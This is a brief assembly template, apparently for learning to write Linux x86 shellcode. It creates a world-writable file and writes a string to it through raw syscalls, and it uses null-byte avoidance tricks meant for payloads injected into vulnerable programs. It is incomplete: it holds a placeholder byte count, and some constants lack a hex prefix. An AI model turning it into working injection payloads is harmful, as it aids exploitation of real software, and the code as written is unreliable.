    # shell code template 1.0
    # useage: 
        #   gcc -m32 -c youfilename.S
        #   objdump -d youfilename.o > youfilename.d
        #   vi youfilename.d and copy the machine code
    

    #create file
    xorl %eax, %eax
    movb $8, %al
    mov $55484c50, %ebx   #caution, make sure that your address does not contain 00
    subl $0x10101090, 8(%ebx)       #this was to end your filename with '00', you need modify as you need according to the number you filled in after the filename string              
    xorl %ecx, %ecx                 
    mov $0777, %cx
    int $0x80
    #write file
    mov %eax, %ebx
    xorl %eax, %eax
    movb $4, %al
    mov $55484c5a, %ecx     #caution, make sure that your address does not contain 00
    xorl %edx, %edx
    mov $[number of bytes of string], %dl
    int $0x80